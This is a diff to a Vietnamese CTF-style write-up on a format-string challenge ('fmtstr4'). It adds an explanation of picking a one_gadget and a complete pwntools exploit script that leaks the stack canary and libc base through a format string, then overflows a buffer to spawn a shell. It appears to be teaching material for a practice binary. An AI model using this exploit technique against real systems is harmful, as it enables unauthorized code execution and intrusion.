@@ -236,10 +236,45 @@ Sử dụng *one_gadget*:
 
 ![Alt text](image/fs16.png)
 
-Mỗi *one_gadget* sẽ có các điều kiện để tạo shell. Ví dụ: one_gadget đầu cần thanh ghi `r15` và `r12` chứa NULL hoặc địa chỉ bên trong của chúng chứa NULL.
+Mỗi *one_gadget* sẽ có các điều kiện để tạo shell. Ví dụ: *one_gadget* đầu cần thanh ghi `r15` và `r12` chứa NULL hoặc địa chỉ bên trong của chúng chứa NULL.
 
 Giờ ta cần tìm xem ta thỏa được điều kiện nào bằng cách check các thanh ghi tại lệnh return:
 
 ![Alt text](image/fs17.png)
 
-Chỉ có thanh ghi `r15` và `r12`
+Chỉ có thanh ghi `r15` và `r12` là cặp thanh ghi cùng thỏa điều kiện của *one_gadget*. Vậy ta sẽ dùng địa chỉ `0xe3b01`.
+
+Nhập payload:
+
+	one_gadget=libc.address+ 0xe3b01
+	payload=b'A'*0x38 + p64(canary) + p64(0) + p64(one_gadget)
+	p.sendafter(b'secret: ',payload)
+
+## Script Python
+
+	#!/usr/bin/env python3
+	from pwn import *
+	exe=ELF('./fmtstr4_patched',checksec=False)
+	libc=ELF('./libc-2.31.so',checksec=False)
+	p=process(exe.path)
+	
+	ID=b'01234456789'
+	ID+=b'%21$p%23$p'
+	p.sendafter(b'ID: ',ID)
+	p.sendafter(b'Password: ',b'&WPAbC&M!%8S5X#W')
+	
+	p.recvuntil(b'01234456789')
+	data=p.recvuntil(b'Enter',drop=True).split(b'0x')
+	canary=int(data[1],16)
+	libc_leak=int(data[2],16)
+	libc.address=libc_leak-0x24083
+	log.info('canary: '+hex(canary))
+	log.info('libc_leak: '+hex(libc_leak))
+	log.info('libc.addr: '+hex(libc.address))
+	 
+	one_gadget=libc.address+ 0xe3b01
+	payload=b'A'*0x38 + p64(canary) + p64(0) + p64(one_gadget)
+	p.sendafter(b'secret: ',payload)
+	
+	p.interactive()
+
